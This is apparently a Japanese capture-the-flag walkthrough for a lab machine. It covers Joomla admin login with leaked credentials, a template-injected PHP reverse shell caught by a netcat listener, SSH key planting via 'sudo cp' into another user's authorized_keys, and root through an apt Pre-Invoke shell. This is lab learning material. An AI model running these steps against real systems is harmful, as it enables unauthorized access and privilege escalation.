### 論点
- joomlaのtemplateにreverse-shellする
- authorized_keysへの書き込み
### keyword
- joomla,sudo(cp,apt)

## 攻略
- nmapする
  - 22,80
- サイトを見る
  - 普通のapacheのサイト。ソースを見るが、特に何もない
- gobuster
  - `gobuster dir -u $IP -w $dirsmall -x php,txt`
  - `/joomla`,`/test`が見つかる
  - /test/のソースにユーザ名とパスワードがある
- http://$IP/joomla/のサイト見ると何かまだサイトが隠れていそう
  - もう一回gobusterする
  - `/administrator`に接続してダッシュボードにログインする
- joomlaなのでjoomscanをやってみる
  - `joomscan -u $IP`
  - 特に新しい情報がない。さっきと同じアドレスぐらいしか出てこない  
- ダッシュボードにログインする
  - cmsでまず試すのはpluginやtemplateからreverse-shellをアップロードしたり貼り付けたりできないか
  - サイトの上にあるextensions -> Templates -> Templates
  - Beez3,Protostarのどっちを選んでもいい、index.php,error.phpのどれを選んでもいい
  - php-reverse-shellを貼り付けて左上にある緑色のsaveする
  - Parrotでncコマンドで待ち受ける
  - template_previewボタンを押す
  - (補足)rlwrapで待受すると何が違う
    - `rlwrap nc -nlvp 9001`
    - 対話型シェルにしてもコマンド履歴が使えるので、こっちを使う
- 対話型シェルをする
- ユーザが誰がいるか調べる
  - `ls -l /home` 
- joomlaの設定ファイルを見て、データベースのユーザとパスワードをコピーする
- jennyに切り替える
- SUID
  - 特になし
- `sudo -l`
  - `/usr/bin/cp`があるのがわかる
  - jennyが公開鍵と秘密鍵を作って、公開鍵をshenronにコピーするのを試みる
- とりあえず次はshenronユーザを目指す。shenronのホームを見てみようとするが、権限不足でダメ
- shenronユーザに公開鍵を置いて、sshをする
  - ファイル名はデフォルトでパスワードは好きなのにする。別に空でもいい
  - `ssh-keygen`
  - とりあえずjennyの隠しファイルにid_rsa.pubができたのを確認する
  - `cd /home/jenny/.ssh`
  - shenron権限でid_rsa.pubをshenronのauthorized_keysに書き込む。ちなみに`/authorized_keys/`とするとダメ。authorized_keysはファイルなので
  - `sudo -u shenron /usr/bin/cp id_rsa.pub /home/shenron/.ssh/authorized_keys`

- これでshenronに公開鍵を置けたのでjennyでsshする
  - `ssh shenron@localhost`
- shenron
  - `sudo -l`するがパスワードがわからない
- shenronの読めるファイルを探す
  - `find / -user shenron -type f 2>/dev/null`
  - /var/opt/password.txt
- `sudo -l`を再びする
- rootになる
  -  `sudo /usr/bin/apt update -o APT::Update::Pre-Invoke::=/bin/sh`
   
     
## 参考
### 公開鍵認証
- 初めに自分のところで?コマンドで?と?を作る。これはデフォルトで?フォルダに作られる。次に?をターゲットのユーザの/home/ユーザ名/?/?に書き込む

### cpコマンド
  - `cp 指定のファイル名 コピー先のファイル名(好きな名前をつけられる)`
- (練習)userの持っているid_rsa.pubを/tmp/.ssh/authorized_keysにコピーする練習をする
  - とりあえずcpコマンドではフォルダは作られないので作る
    - `mkdir /tmp/.ssh`
  - コピーする
    - `cp id_rsa.pub /tmp/.ssh/authorized_keys`    
